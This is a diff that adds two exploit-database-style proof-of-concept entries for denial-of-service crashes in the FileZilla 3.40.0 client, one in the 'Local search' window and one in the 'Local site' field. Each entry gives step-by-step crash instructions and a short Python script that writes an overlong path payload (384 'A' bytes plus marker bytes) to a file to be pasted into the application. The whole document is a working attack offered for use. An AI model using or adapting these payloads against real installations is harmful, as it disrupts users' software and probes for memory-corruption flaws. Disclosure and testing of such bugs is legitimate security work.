@@ -1,0 +1,56 @@
+# Exploit Title: FileZilla 3.40.0 - "Local search" Denial of Service (PoC)
+# Discovery by: Mr Winst0n
+# Discovery Date: February 20, 2019
+# Vendor Homepage: https://filezilla-project.org
+# Software Link : https://filezilla-project.org/download.php?type=client&show_all=1
+# Tested Version: 3.40.0
+# Tested on: Kali linux x86_64
+# Vulnerability Type: Denial of Service (DoS)
+
+
+# Steps to Produce the Crash:
+# 1.- Run python code : python filezilla.py
+# 2.- Open buff.txt and copy content to clipboard
+# 3.- Open Filezilla (located in bin folder), in top bar click on Binoculars icon (search for files recursively)
+# 4.- In the opend window, Set Search type to "Local search"
+# 5.- Paste ClipBoard on "Search directory" and click on "Search"
+# 6.- Boom! Crashed...
+
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 384
+crash = "/" + buffer + "BBBB" + "CCCC"
+f = open("buff.txt", "w")
+f.write(crash)
+f.close()
+
+# Note: If you have not "/" before payload, you should add it to begining of payload, So the program recognizes it as a valid path.
+
+
+# Exploit Title: FileZilla 3.40.0 - "Local site" Denial of Service (PoC)
+# Discovery by: Mr Winst0n
+# Discovery Date: February 25, 2019
+# Vendor Homepage: https://filezilla-project.org
+# Software Link : https://filezilla-project.org/download.php?type=client&show_all=1
+# Tested Version: 3.40.0
+# Tested on: Kali linux x86_64
+# Vulnerability Type: Denial of Service (DoS)
+
+
+# Steps to Produce the Crash:
+# 1.- Run python code : python filezilla-2.py
+# 2.- Open crash.txt and copy content to clipboard
+# 3.- In "Local site" section paste clipboard and Enter.
+# 4.- Boom! Crashed...
+
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 384
+crash = "/" + buffer + "BBBB" + "CCCC"
+f = open("crash.txt", "w")
+f.write(crash)
+f.close()
+
+# Note: If you have not "/" before payload, you should add it to begining of payload, So the program recognizes it as a valid path.
